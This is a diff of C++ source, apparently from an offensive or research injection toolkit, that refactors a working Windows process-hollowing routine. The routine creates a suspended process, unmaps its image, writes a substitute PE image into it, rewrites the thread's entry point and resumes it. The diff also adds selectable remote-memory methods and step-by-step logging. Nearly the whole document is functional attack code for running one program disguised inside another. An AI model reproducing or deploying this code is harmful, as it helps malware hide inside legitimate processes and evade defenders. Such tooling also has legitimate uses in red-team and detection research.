@@ -2,23 +2,31 @@
 #include <string>
 
 #include "common.h"
+#include "scripts.h"
 #include "sysapi.h"
 #include "unique_memory.h"
 
 
 namespace scripts {
 
-bool inject_create_process_hollowed(const std::wstring& original_image, const std::wstring& injected_image) {
+bool inject_create_process_hollowed(const std::wstring& original_image,
+                                    const std::wstring& injected_image,
+                                    RemoteProcessMemoryMethod method) {
 
-    wprintf(L"Creating process...\n");
+    wprintf(L"\nPreparing a new process\n");
+
+    wprintf(L"  [*] creating process...\n");
 
     auto process = sysapi::ProcessCreate(original_image, true);
     if (process.hProcess == NULL) {
         return false;
     }
 
-    auto *PEBAddress = sysapi::ProcessGetPEBAddress(process.hProcess.get());
-    if (PEBAddress == nullptr) {
+    wprintf(L"  [*] getting process PEB address...\n");
+
+    PROCESS_BASIC_INFORMATION BasicInfo;
+    auto res = sysapi::ProcessGetBasicInfo(process.hProcess.get(), BasicInfo);
+    if (!res) {
         return false;
     }
 
@@ -27,35 +35,32 @@ bool inject_create_process_hollowed(const std::wstring& original_image, const st
         return false;
     }
 
-    size_t read = sysapi::VirtualMemoryRead(process_peb.data(), sizeof(PEB), PEBAddress, process.hProcess.get());
+    wprintf(L"  [*] reading process PEB at 0x%p...\n", BasicInfo.PebBaseAddress);
+
+    size_t read = sysapi::VirtualMemoryRead(process_peb.data(), sizeof(PEB), BasicInfo.PebBaseAddress, process.hProcess.get());
     if (read == 0) {
         return false;
     }
 
-    wprintf(L"Unmapping process section...\n");
+    wprintf(L"\nPreparing the injected image\n");
+    wprintf(L"  [*] opening image...\n");
 
-    bool res = sysapi::SectionUnmapView(process_peb->ImageBaseAddress, process.hProcess.get());
-    if (!res) {
+    sysapi::unique_handle ImageHandle = sysapi::FileOpen(injected_image.c_str());
+    if (ImageHandle == NULL) {
         return false;
     }
 
-    wprintf(L"Opening process image...\n");
+    wprintf(L"  [*] getting image file size...\n");
 
-    sysapi::unique_handle hFile = sysapi::FileOpen(injected_image.c_str());
-    if (hFile == NULL)
-    {
+    size_t FileSize = sysapi::FileGetSize(ImageHandle.get());
+    if (FileSize == NULL) {
         return false;
     }
 
-    size_t FileSize = sysapi::FileGetSize(hFile.get());
-    if (FileSize == NULL)
-    {
-        return false;
-    }
+    wprintf(L"  [*] mapping image file...\n");
 
-    auto ImageFileSection = sysapi::SectionFileCreate(hFile.get());
-    if (ImageFileSection == NULL)
-    {
+    auto ImageFileSection = sysapi::SectionFileCreate(ImageHandle.get());
+    if (ImageFileSection == NULL) {
         return false;
     }
 
@@ -67,22 +72,40 @@ bool inject_create_process_hollowed(const std::wstring& original_image, const st
     }
 
     auto* pDOSHeader = (PIMAGE_DOS_HEADER)ImageFileBuffer;
-
     auto* pNT32Header = (PIMAGE_NT_HEADERS32)PTR_ADD(ImageFileBuffer, pDOSHeader->e_lfanew);
     auto* pNT64Header = (PIMAGE_NT_HEADERS64)pNT32Header;
 
     bool is_64 = pNT32Header->OptionalHeader.Magic == IMAGE_NT_OPTIONAL_HDR64_MAGIC;
 
-    wprintf(L"Allocating memory for new image...\n");
+    RemoteProcessMemoryContext ctx;
+    ctx.method = method;
+    ctx.ProcessHandle = process.hProcess.get();
+    ctx.Size = pNT32Header->OptionalHeader.SizeOfImage;
 
-    process_peb->ImageBaseAddress = sysapi::VirtualMemoryAllocate(pNT32Header->OptionalHeader.SizeOfImage, PAGE_EXECUTE_READWRITE, process.hProcess.get(), process_peb->ImageBaseAddress);
-    if (process_peb->ImageBaseAddress == nullptr) {
+    wprintf(L"\nPlacing the new image in the target process\n");
+
+    if (ctx.method == RemoteProcessMemoryMethod::CreateSectionMap ||
+        ctx.method == RemoteProcessMemoryMethod::CreateSectionMapLocalMap) {
+
+        ctx.RemoteBaseAddress = process_peb->ImageBaseAddress;
+
+        wprintf(L"  [*] unmapping original process image section...\n");
+
+        res = sysapi::SectionUnmapView(ctx.RemoteBaseAddress, process.hProcess.get());
+        if (!res) {
+            return false;
+        }
+    }
+
+    res = process_create_memory(ctx);
+    if (!res) {
         return false;
     }
 
-    wprintf(L"Writing image headers...\n");
+    wprintf(L"\nWriting new image\n");
+    wprintf(L"  [*] writing headers at 0x%p...\n", process_peb->ImageBaseAddress);
 
-    res = sysapi::VirtualMemoryWrite(ImageFileBuffer, pNT32Header->OptionalHeader.SizeOfHeaders, process_peb->ImageBaseAddress, process.hProcess.get());
+    res = process_write_memory(ctx, 0, ImageFileBuffer, pNT32Header->OptionalHeader.SizeOfHeaders);
     if (!res) {
         return false;
     }
@@ -95,22 +118,22 @@ bool inject_create_process_hollowed(const std::wstring& original_image, const st
             continue;
         }
 
-        auto pSectionDestination = PTR_ADD(process_peb->ImageBaseAddress, pSections[i].VirtualAddress);
+        wprintf(L"  [*] writing %hs section at 0x%p...\n", (char*)pSections[i].Name, PTR_ADD(process_peb->ImageBaseAddress, pSections[i].VirtualAddress));
 
-        wprintf(L"Writing %hs section to 0x%p...\n", (char*)pSections[i].Name, pSectionDestination);
-
-        res = sysapi::VirtualMemoryWrite(PTR_ADD(ImageFileBuffer, pSections[i].PointerToRawData), pSections[i].SizeOfRawData, pSectionDestination, process.hProcess.get());
+        res = process_write_memory(ctx, pSections[i].VirtualAddress, PTR_ADD(ImageFileBuffer, pSections[i].PointerToRawData), pSections[i].SizeOfRawData);
         if (!res) {
             return false;
         }
     }
 
-    wprintf(L"Relocating image...\n");
+    wprintf(L"\nRelocating image\n");
 
-    res = sysapi::PeImageRelocate(ImageFileBuffer, process_peb->ImageBaseAddress, process.hProcess.get());
+    res = process_pe_image_relocate(ctx, ImageFileBuffer);
     if (!res) {
         return false;
     }
+
+    wprintf(L"\nFixing thread\n");
 
     if (is_64) {
 
@@ -123,7 +146,7 @@ bool inject_create_process_hollowed(const std::wstring& original_image, const st
 
         context->ContextFlags = CONTEXT_FULL;
 
-        wprintf(L"Getting thread context...\n");
+        wprintf(L"  [*] getting old thread context...\n");
 
         res = sysapi::ThreadGetContext(process.hThread.get(), context.data());
         if (!res) {
@@ -132,15 +155,15 @@ bool inject_create_process_hollowed(const std::wstring& original_image, const st
 
         context->Rcx = (DWORD64)(UINT_PTR)PTR_ADD(process_peb->ImageBaseAddress, pNT64Header->OptionalHeader.AddressOfEntryPoint);
 
-        wprintf(L"Setting thread context..\n");
+        wprintf(L"  [*] setting new thread context with EP at 0x%p...\n", (PVOID)(UINT_PTR)context->Rcx);
 
         res = sysapi::ThreadSetContext(process.hThread.get(), context.data());
         if (!res) {
             return false;
         }
     }
-    else
-    {
+    else {
+
         unique_c_mem<WOW64_CONTEXT> context;
         if (!context.allocate()) {
             return false;
@@ -150,7 +173,7 @@ bool inject_create_process_hollowed(const std::wstring& original_image, const st
 
         context->ContextFlags = CONTEXT_FULL;
 
-        wprintf(L"Getting thread context...\n");
+        wprintf(L"  [*] getting old thread context...\n");
 
         res = sysapi::ThreadGetWow64Context(process.hThread.get(), context.data());
         if (!res) {
@@ -159,7 +182,7 @@ bool inject_create_process_hollowed(const std::wstring& original_image, const st
 
         context->Eax = (DWORD)(UINT_PTR)PTR_ADD(process_peb->ImageBaseAddress, pNT32Header->OptionalHeader.AddressOfEntryPoint);
 
-        wprintf(L"Setting thread context...\n");
+        wprintf(L"  [*] setting new thread context with EP at 0x%p...\n", (PVOID)(UINT_PTR)context->Eax);
 
         res = sysapi::ThreadSetWow64Context(process.hThread.get(), context.data());
         if (!res) {
@@ -167,13 +190,13 @@ bool inject_create_process_hollowed(const std::wstring& original_image, const st
         }
     }
 
-    wprintf(L"Resuming thread...\n");
+    wprintf(L"  [*] resuming thread...\n");
 
     if (!ResumeThread(process.hThread.get())) {
         return false;
     }
 
-    wprintf(L"Process hollowing complete\n");
+    wprintf(L"\nSuccess\n");
     return true;
 }
 
